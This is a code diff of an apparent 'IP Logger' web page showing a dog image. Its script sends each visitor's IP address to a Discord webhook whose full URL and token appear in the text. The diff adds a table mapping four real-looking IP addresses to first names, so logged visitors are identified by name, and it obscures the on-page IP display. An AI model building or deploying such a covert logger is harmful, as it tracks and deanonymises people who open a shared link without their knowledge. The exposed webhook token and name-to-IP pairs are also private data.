@@ -20,6 +20,7 @@
 </head>
 <body>
     <h1>Your IP Address is: <span id="ip-address"></span></h1>
+    <h1><span id="ip-address">☻☻☻☻☻☻☻</span></h1>
     <img src="dog.gif" alt="Dog Image">
 
     <script>
@@ -38,9 +39,32 @@
         function sendToDiscord(ip) {
             const webhookUrl = 'https://discord.com/api/webhooks/1222312130359988265/H_OfIlclzvLA0AbQtHT0QSOr-I_LhyTEmeAcvxHmALrjVgjCrP9q9wa7JqpatNUISZ7F';
             const currentDate = new Date().toISOString();
+            
+            let username;
+            switch (ip) {
+                case '159.2.203.69':
+                    username = 'Cooper';
+                    break;
+                case '142.163.139.71':
+                    username = 'Andre';
+                    break;
+                case '156.57.53.55':
+                    username = 'Gregor';
+                    break;
+                case '142.163.139.87':
+                    username = 'Lincoln';
+                    break;
+                default:
+                    username = 'Unknown';
+                    break;
+            }
+
             const embed = {
-                title: "IP Logger - vsco.one",
+                title: "IP Logger",
                 description: `IP Logged: ${ip}`,
+                fields: [
+                    { name: "User", value: username }
+                ],
                 timestamp: currentDate,
                 color: 3447003
             };
